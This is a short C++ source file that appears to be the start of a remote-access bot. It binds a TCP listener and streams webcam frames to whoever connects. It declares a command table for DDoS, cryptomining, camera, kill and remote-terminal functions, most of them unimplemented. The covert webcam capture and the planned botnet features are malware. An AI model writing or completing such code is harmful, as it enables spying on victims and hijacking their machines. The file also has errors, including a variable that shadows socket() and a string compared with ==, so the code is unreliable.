#include <sys/socket.h>
#include <opencv2/opencv.hpp>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>
#define PORT 12000
#define BUFFER_SIZE 1024

int capture(int* socket) {
    char response_buffer[BUFFER_SIZE];
    cv::VideoCapture cap(0);
    cv::Mat frame;
    std::vector<uchar> buffer;
    std::vector<int> params = {cv::IMWRITE_JPEG_QUALITY, 80};

    while (true) {
        cap >> frame;
        cv::imencode(".jpg", frame, buffer, params);
        unsigned long frame_size = buffer.size();
        if (send(*socket, &frame_size, sizeof(frame_size), 0) < 0) {
            return -1;
        }
        if (send(*socket, buffer.data(), frame_size, 0) < 0) {
            return -1;
        }
        recv(*socket, &response_buffer, BUFFER_SIZE, 0);
        if (response_buffer == "disconnect") {
            break;
        }
    }
    close(*socket);
    cap.release();
}

struct hash {
    const char* key;
    void (*value);
};

struct hash2 {
    const char* key;
    void (*value)(const char* ip);
};

struct hash3 {
    const char* key;
    int (*value)(int* socket);
};

struct functions {
    struct hash2 ddos;
    struct hash miner;
    struct hash3 camera;
    struct hash idle;
    struct hash kill;
    struct hash rterminal;
};

int main() {
    struct functions funcs {

    };

    int socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    int opt = 1;
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    int bind_success = bind(server_fd, (struct sockaddr*)&address, addrlen);
    int listen_success = listen(server_fd, 10);
    socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen);

    while (true) {
        char buffer[BUFFER_SIZE];
        recv(socket, &buffer, sizeof(buffer), 0);
        if (strlen(buffer) > 0) {

        }
    }
}
